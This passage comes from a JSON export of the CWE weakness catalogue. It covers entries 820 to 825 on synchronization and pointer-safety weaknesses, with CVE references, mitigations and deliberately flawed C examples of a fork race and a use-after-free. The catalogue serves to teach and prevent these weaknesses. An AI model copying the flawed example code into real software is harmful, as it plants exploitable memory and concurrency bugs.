              "BodyText": "IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2009-1549",
          "Description": "Attacker can bypass authentication by setting a cookie to a specific value.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1549"
        },
        {
          "Reference": "CVE-2009-1619",
          "Description": "Attacker can bypass authentication and gain admin privileges by setting an \"admin\" cookie to 1.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1619"
        },
        {
          "Reference": "CVE-2009-0864",
          "Description": "Content management system allows admin privileges by setting a \"login\" cookie to \"OK.\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0864"
        },
        {
          "Reference": "CVE-2008-5784",
          "Description": "e-dating application allows admin privileges by setting the admin cookie to 1.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5784"
        },
        {
          "Reference": "CVE-2008-6291",
          "Description": "Web-based email list manager allows attackers to gain admin privileges by setting a login cookie to \"admin.\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-6291"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "SEC09-J",
          "EntryName": "Do not base security checks on untrusted sources"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-754",
          "Authors": [
            "Frank Kim"
          ],
          "Title": "Top 25 Series - Rank 6 - Reliance on Untrusted Inputs in a Security Decision",
          "PublicationYear": "2010",
          "PublicationMonth": "03",
          "PublicationDay": "05",
          "Publisher": "SANS Software Security Institute",
          "URL": "https://www.sans.org/blog/top-25-series-rank-6-reliance-on-untrusted-inputs-in-a-security-decision/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-529",
          "Title": "HMAC",
          "PublicationYear": "2011",
          "PublicationMonth": "08",
          "PublicationDay": "18",
          "Publisher": "Wikipedia",
          "URL": "https://en.wikipedia.org/wiki/HMAC",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-756",
          "Authors": [
            "Scott Mitchell"
          ],
          "Title": "Understanding ASP.NET View State",
          "PublicationYear": "2004",
          "PublicationMonth": "05",
          "PublicationDay": "15",
          "Publisher": "Microsoft",
          "URL": "https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/ms972976(v=msdn.10)?redirectedfrom=MSDN",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-45",
          "Authors": [
            "OWASP"
          ],
          "Title": "OWASP Enterprise Security API (ESAPI) Project",
          "URL": "http://www.owasp.org/index.php/ESAPI"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "820",
      "Name": "Missing Synchronization",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product utilizes a shared resource in a concurrent manner but does not attempt to synchronize access to the resource.",
      "ExtendedDescription": "If access to a shared resource is not synchronized, then the resource may not be in a state that is expected by the product. This might lead to unexpected or insecure behaviors, especially if an attacker can influence the shared resource.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Other"
          ],
          "Impact": [
            "Modify Application Data",
            "Read Application Data",
            "Alter Execution Logic"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-170",
          "Entries": [
            {
              "IntroText": "The following code intends to fork a process, then have both the parent and child processes print a single line."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tstatic void print (char * string) {\n\t\t\tchar * word;\n\t\t\tint counter;\n\t\t\tfor (word = string; counter = *word++; ) {\n\t\t\t\t\tputc(counter, stdout);\n\t\t\t\t\tfflush(stdout);\n```\n/* Make timing window a little larger... */* \n\t\t\t\t\t\n\t\t\t\t\tsleep(1);}}\n\t\n\tint main(void) {\n\t```\n\t\t\tpid_t pid;\n\t\t\tpid = fork();\n\t\t\tif (pid == -1) {\n\t\t\t\texit(-2);\n\t\t\t}\n\t\t\telse if (pid == 0) {\n\t\t\t\tprint(\"child\\n\");\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint(\"PARENT\\n\");\n\t\t\t}\n\t\t\texit(0);\n\t}\n```"
            },
            {
              "BodyText": "One might expect the code to print out something like:"
            },
            {
              "BodyText": "```\n\t\tPARENT\n\t\tchild\n```"
            },
            {
              "BodyText": "However, because the parent and child are executing concurrently, and stdout is flushed each time a character is printed, the output might be mixed together, such as:"
            },
            {
              "BodyText": "```\n\t\tPcAhRiElNdT\n\t\t[blank line]\n\t\t[blank line]\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "LCK05-J",
          "EntryName": "Synchronize access to static fields that can be modified by untrusted code"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "Deeper research is necessary for synchronization and related mechanisms, including locks, mutexes, semaphores, and other mechanisms. Multiple entries are dependent on this research, which includes relationships to concurrency, race conditions, reentrant functions, etc. CWE-662 and its children - including CWE-667, CWE-820, CWE-821, and others - may need to be modified significantly, along with their relationships."
        }
      ]
    },
    {
      "ID": "821",
      "Name": "Incorrect Synchronization",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product utilizes a shared resource in a concurrent manner, but it does not correctly synchronize access to the resource.",
      "ExtendedDescription": "If access to a shared resource is not correctly synchronized, then the resource may not be in a state that is expected by the product. This might lead to unexpected or insecure behaviors, especially if an attacker can influence the shared resource.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Other"
          ],
          "Impact": [
            "Modify Application Data",
            "Read Application Data",
            "Alter Execution Logic"
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "Deeper research is necessary for synchronization and related mechanisms, including locks, mutexes, semaphores, and other mechanisms. Multiple entries are dependent on this research, which includes relationships to concurrency, race conditions, reentrant functions, etc. CWE-662 and its children - including CWE-667, CWE-820, CWE-821, and others - may need to be modified significantly, along with their relationships."
        }
      ]
    },
    {
      "ID": "822",
      "Name": "Untrusted Pointer Dereference",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product obtains a value from an untrusted source, converts this value to a pointer, and dereferences the resulting pointer.",
      "ExtendedDescription": "\n\nAn attacker can supply a pointer for memory locations that the product is not expecting. If the pointer is dereferenced for a write operation, the attack might allow modification of critical state variables, cause a crash, or execute code. If the dereferencing operation is for a read, then the attack might allow reading of sensitive data, cause a crash, or set a variable to an unexpected value (since the value will be read from an unexpected memory location).\n\n\nThere are several variants of this weakness, including but not necessarily limited to:\n\n\n  - The untrusted value is directly invoked as a function call.\n\n  - In OS kernels or drivers where there is a boundary between \"userland\" and privileged memory spaces, an untrusted pointer might enter through an API or system call (see CWE-781 for one such example).\n\n  - Inadvertently accepting the value from an untrusted control sphere when it did not have to be accepted as input at all. This might occur when the code was originally developed to be run by a single user in a non-networked environment, and the code is then ported to or otherwise exposed to a networked environment.\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1340",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "125",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "787",
          "ViewID": "1000"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Memory"
          ],
          "Note": "If the untrusted pointer is used in a read operation, an attacker might be able to read sensitive portions of memory."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "If the untrusted pointer references a memory location that is not accessible to the product, or points to a location that is \"malformed\" or larger than expected by a read or write operation, the application may terminate unexpectedly."
        },
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands",
            "Modify Memory"
          ],
          "Note": "If the untrusted pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-5655",
          "Description": "message-passing framework interprets values in packets as pointers, causing a crash.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-5655"
        },
        {
          "Reference": "CVE-2010-2299",
          "Description": "labeled as a \"type confusion\" issue, also referred to as a \"stale pointer.\" However, the bug ID says \"contents are simply interpreted as a pointer... renderer ordinarily doesn't supply this pointer directly\". The \"handle\" in the untrusted area is replaced in one function, but not another - thus also, effectively, exposure to wrong sphere (CWE-668).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2299"
        },
        {
          "Reference": "CVE-2009-1719",
          "Description": "Untrusted dereference using undocumented constructor.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1719"
        },
        {
          "Reference": "CVE-2009-1250",
          "Description": "An error code is incorrectly checked and interpreted as a pointer, leading to a crash.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1250"
        },
        {
          "Reference": "CVE-2009-0311",
          "Description": "An untrusted value is obtained from a packet and directly called as a function pointer, leading to code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0311"
        },
        {
          "Reference": "CVE-2010-1818",
          "Description": "Undocumented attribute in multimedia software allows \"unmarshaling\" of an untrusted pointer.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-1818"
        },
        {
          "Reference": "CVE-2010-3189",
          "Description": "ActiveX control for security software accepts a parameter that is assumed to be an initialized pointer.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3189"
        },
        {
          "Reference": "CVE-2010-1253",
          "Description": "Spreadsheet software treats certain record values that lead to \"user-controlled pointer\" (might be untrusted offset, not untrusted pointer).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-1253"
        }
      ],
      "RelatedAttackPatterns": [
        "129"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "There are close relationships between incorrect pointer dereferences and other weaknesses related to buffer operations. There may not be sufficient community agreement regarding these relationships. Further study is needed to determine when these relationships are chains, composites, perspective/layering, or other types of relationships. As of September 2010, most of the relationships are being captured as chains."
        },
        {
          "Type": "Terminology",
          "Note": "Many weaknesses related to pointer dereferences fall under the general term of \"memory corruption\" or \"memory safety.\" As of September 2010, there is no commonly-used terminology that covers the lower-level variants."
        }
      ]
    },
    {
      "ID": "823",
      "Name": "Use of Out-of-range Pointer Offset",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product performs pointer arithmetic on a valid pointer, but it uses an offset that can point outside of the intended range of valid memory locations for the resulting pointer.",
      "ExtendedDescription": "\n\nWhile a pointer can contain a reference to any arbitrary memory location, a program typically only intends to use the pointer to access limited portions of memory, such as contiguous memory used to access an individual array.\n\n\nPrograms may use offsets in order to access fields or sub-elements stored within structured data. The offset might be out-of-range if it comes from an untrusted source, is the result of an incorrect calculation, or occurs because of another error.\n\n\nIf an attacker can control or influence the offset so that it points outside of the intended boundaries of the structure, then the attacker may be able to read or write to memory locations that are used elsewhere in the product. As a result, the attack might change the state of the product as accessed through program variables, cause a crash or instable behavior, and possibly lead to code execution.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1340",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "125",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "787",
          "ViewID": "1000"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Untrusted pointer offset",
          "Description": "This term is narrower than the concept of \"out-of-range\" offset, since the offset might be the result of a calculation or other error that does not depend on any externally-supplied values."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Memory"
          ],
          "Note": "If the untrusted pointer is used in a read operation, an attacker might be able to read sensitive portions of memory."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "If the untrusted pointer references a memory location that is not accessible to the program, or points to a location that is \"malformed\" or larger than expected by a read or write operation, the application may terminate unexpectedly."
        },
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands",
            "Modify Memory"
          ],
          "Note": "If the untrusted pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2010-2160",
          "Description": "Invalid offset in undocumented opcode leads to memory corruption.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2160"
        },
        {
          "Reference": "CVE-2010-1281",
          "Description": "Multimedia player uses untrusted value from a file when using file-pointer calculations.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-1281"
        },
        {
          "Reference": "CVE-2009-3129",
          "Description": "Spreadsheet program processes a record with an invalid size field, which is later used as an offset.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3129"
        },
        {
          "Reference": "CVE-2009-2694",
          "Description": "Instant messaging library does not validate an offset value specified in a packet.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2694"
        },
        {
          "Reference": "CVE-2009-2687",
          "Description": "Language interpreter does not properly handle invalid offsets in JPEG image, leading to out-of-bounds memory access and crash.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2687"
        },
        {
          "Reference": "CVE-2009-0690",
          "Description": "negative offset leads to out-of-bounds read",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0690"
        },
        {
          "Reference": "CVE-2008-4114",
          "Description": "untrusted offset in kernel",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4114"
        },
        {
          "Reference": "CVE-2010-2873",
          "Description": "\"blind trust\" of an offset value while writing heap memory allows corruption of function pointer,leading to code execution",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2873"
        },
        {
          "Reference": "CVE-2010-2866",
          "Description": "negative value (signed) causes pointer miscalculation",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2866"
        },
        {
          "Reference": "CVE-2010-2872",
          "Description": "signed values cause incorrect pointer calculation",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2872"
        },
        {
          "Reference": "CVE-2007-5657",
          "Description": "values used as pointer offsets",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-5657"
        },
        {
          "Reference": "CVE-2010-2867",
          "Description": "a return value from a function is sign-extended if the value is signed, then used as an offset for pointer arithmetic",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2867"
        },
        {
          "Reference": "CVE-2009-1097",
          "Description": "portions of a GIF image used as offsets, causing corruption of an object pointer.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1097"
        },
        {
          "Reference": "CVE-2008-1807",
          "Description": "invalid numeric field leads to a free of arbitrary memory locations, then code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1807"
        },
        {
          "Reference": "CVE-2007-2500",
          "Description": "large number of elements leads to a free of an arbitrary address",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-2500"
        },
        {
          "Reference": "CVE-2008-1686",
          "Description": "array index issue (CWE-129) with negative offset, used to dereference a function pointer",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1686"
        },
        {
          "Reference": "CVE-2010-2878",
          "Description": "\"buffer seek\" value - basically an offset?",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2878"
        }
      ],
      "RelatedAttackPatterns": [
        "129"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 6, \"Pointer Arithmetic\", Page 277",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "There are close relationships between incorrect pointer dereferences and other weaknesses related to buffer operations. There may not be sufficient community agreement regarding these relationships. Further study is needed to determine when these relationships are chains, composites, perspective/layering, or other types of relationships. As of September 2010, most of the relationships are being captured as chains."
        },
        {
          "Type": "Terminology",
          "Note": "Many weaknesses related to pointer dereferences fall under the general term of \"memory corruption\" or \"memory safety.\" As of September 2010, there is no commonly-used terminology that covers the lower-level variants."
        }
      ]
    },
    {
      "ID": "824",
      "Name": "Access of Uninitialized Pointer",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product accesses or uses a pointer that has not been initialized.",
      "ExtendedDescription": "\n\nIf the pointer contains an uninitialized value, then the value might not point to a valid memory location. This could cause the product to read from or write to unexpected memory locations, leading to a denial of service. If the uninitialized pointer is used as a function call, then arbitrary functions could be invoked. If an attacker can influence the portion of uninitialized memory that is contained in the pointer, this weakness could be leveraged to execute code or perform other attacks.\n\n\nDepending on memory layout, associated memory management behaviors, and product operation, the attacker might be able to influence the contents of the uninitialized pointer, thus gaining more fine-grained control of the memory location to be accessed.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1340",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "125",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "787",
          "ViewID": "1000"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Memory"
          ],
          "Note": "If the uninitialized pointer is used in a read operation, an attacker might be able to read sensitive portions of memory."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "If the uninitialized pointer references a memory location that is not accessible to the product, or points to a location that is \"malformed\" (such as NULL) or larger than expected by a read or write operation, then a crash may occur."
        },
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "If the uninitialized pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2024-32878",
          "Description": "LLM product has a free of an uninitialized pointer",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2024-32878"
        },
        {
          "Reference": "CVE-2010-0211",
          "Description": "chain: unchecked return value (CWE-252) leads to free of invalid, uninitialized pointer (CWE-824).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-0211"
        },
        {
          "Reference": "CVE-2009-2768",
          "Description": "Pointer in structure is not initialized, leading to NULL pointer dereference (CWE-476) and system crash.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2768"
        },
        {
          "Reference": "CVE-2009-1721",
          "Description": "Free of an uninitialized pointer.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1721"
        },
        {
          "Reference": "CVE-2009-1415",
          "Description": "Improper handling of invalid signatures leads to free of invalid pointer.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1415"
        },
        {
          "Reference": "CVE-2009-0846",
          "Description": "Invalid encoding triggers free of uninitialized pointer.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0846"
        },
        {
          "Reference": "CVE-2009-0040",
          "Description": "Crafted PNG image leads to free of uninitialized pointer.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0040"
        },
        {
          "Reference": "CVE-2008-2934",
          "Description": "Crafted GIF image leads to free of uninitialized pointer.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2934"
        },
        {
          "Reference": "CVE-2007-4682",
          "Description": "Access of uninitialized pointer might lead to code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4682"
        },
        {
          "Reference": "CVE-2007-4639",
          "Description": "Step-based manipulation: invocation of debugging function before the primary initialization function leads to access of an uninitialized pointer and code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4639"
        },
        {
          "Reference": "CVE-2007-4000",
          "Description": "Unchecked return values can lead to a write to an uninitialized pointer.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4000"
        },
        {
          "Reference": "CVE-2007-2442",
          "Description": "zero-length input leads to free of uninitialized pointer.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-2442"
        },
        {
          "Reference": "CVE-2007-1213",
          "Description": "Crafted font leads to uninitialized function pointer.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1213"
        },
        {
          "Reference": "CVE-2006-6143",
          "Description": "Uninitialized function pointer in freed memory is invoked",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6143"
        },
        {
          "Reference": "CVE-2006-4175",
          "Description": "LDAP server mishandles malformed BER queries, leading to free of uninitialized memory",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4175"
        },
        {
          "Reference": "CVE-2006-0054",
          "Description": "Firewall can crash with certain ICMP packets that trigger access of an uninitialized pointer.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-0054"
        },
        {
          "Reference": "CVE-2003-1201",
          "Description": "LDAP server does not initialize members of structs, which leads to free of uninitialized pointer if an LDAP request fails.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2003-1201"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 7, \"Variable Initialization\", Page 312",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "There are close relationships between incorrect pointer dereferences and other weaknesses related to buffer operations. There may not be sufficient community agreement regarding these relationships. Further study is needed to determine when these relationships are chains, composites, perspective/layering, or other types of relationships. As of September 2010, most of the relationships are being captured as chains."
        },
        {
          "Type": "Terminology",
          "Note": "Many weaknesses related to pointer dereferences fall under the general term of \"memory corruption\" or \"memory safety.\" As of September 2010, there is no commonly-used terminology that covers the lower-level variants."
        }
      ]
    },
    {
      "ID": "825",
      "Name": "Expired Pointer Dereference",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product dereferences a pointer that contains a location for memory that was previously valid, but is no longer valid.",
      "ExtendedDescription": "When a product releases memory, but it maintains a pointer to that memory, then the memory might be re-allocated at a later time. If the original pointer is accessed to read or write data, then this could cause the product to read or modify data that is in use by a different function or process. Depending on how the newly-allocated memory is used, this could lead to a denial of service, information exposure, or code execution.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1340",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "672",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "125",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "787",
          "ViewID": "1000"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Dangling pointer"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Memory"
          ],
          "Note": "If the expired pointer is used in a read operation, an attacker might be able to control data read in by the application."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "If the expired pointer references a memory location that is not accessible to the product, or points to a location that is \"malformed\" (such as NULL) or larger than expected by a read or write operation, then a crash may occur."
        },
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "If the expired pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Choose a language that provides automatic memory management."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "When freeing pointers, be sure to set them to NULL once they are freed. However, the utilization of multiple or complex data structures may lower the usefulness of this strategy."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-71",
          "Entries": [
            {
              "IntroText": "The following code shows a simple example of a use after free error:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar* ptr = (char*)malloc (SIZE);\n\tif (err) {\n\t\tabrt = 1;\n\t\tfree(ptr);\n\t}\n\t...\n\tif (abrt) {\n\t\tlogError(\"operation aborted before commit\", ptr);\n\t}\n```"
            },
            {
